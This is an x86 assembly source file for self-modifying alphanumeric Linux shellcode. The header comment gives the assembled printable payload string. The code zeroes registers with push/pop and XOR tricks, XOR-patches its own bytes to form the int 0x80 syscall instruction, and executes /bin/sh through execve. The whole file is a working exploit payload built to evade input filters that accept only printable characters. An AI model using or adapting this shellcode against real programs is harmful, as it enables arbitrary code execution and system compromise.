# /* LLLLYhzeroX5zeroPZRh//shh/binTXRRRPRRQRaH5A0AA1F7QX4J4AsO */ #
.macro pmov arg1, arg2
	push \arg1
	popl \arg2
.endm

.macro padd n, reg
.if \n > 0
	inc \reg
	padd "(\n - 1)" \reg
.endif
.if \n < 0
	dec \reg
	padd "(\n + 1)" \reg
.endif
.endm

.macro eip_popl reg
	padd -4, %esp
	popl \reg
.endm

.macro clear_eax
	pmov $0x6f72657a, %eax
	xorl $0x6f72657a, %eax
.endm

.set OFFSET, 0x30
.text
.globl _start
_start:
	eip_popl %ecx		# %ecx -> _start
	clear_eax		# %eax = 0
	pmov %eax, %edx		# %edx = 0

xor_mask:
	decl %eax		# %eax = -1 = 0xffffffff
	xorw $0x3041, %ax	# %ax = (0xff, 0xff) ^ (0x41, 0x30) = (0xbe, 0xcf)

xor_patching:
	xorl %eax, OFFSET(%ecx)	# --> _start + OFFSET = int_0x80_syscall

sys_execve:
	pmov $0x41, %eax
	xorb $0x4a, %al		# %eax = 0x41 ^ 0x4a = 0xb (sys_execve)

push_binsh:
	pushl %edx		# %esp -> ""
	pushl $0x68732f2f	# %esp -> "//sh"
	pushl $0x6e69622f	# %esp -> "/bin//sh"
	pmov %esp, %ebx		# %eax -> "/bin/sh"

argv:
	pushl %edx
	pushl %ebx
	pmov %esp, %ecx

int_0x80_syscall:
	.byte 0x73, 0x4f 	# (0x73, 0x4f) ^ (0xbe, 0xcf) = (0xcd, 0x80)

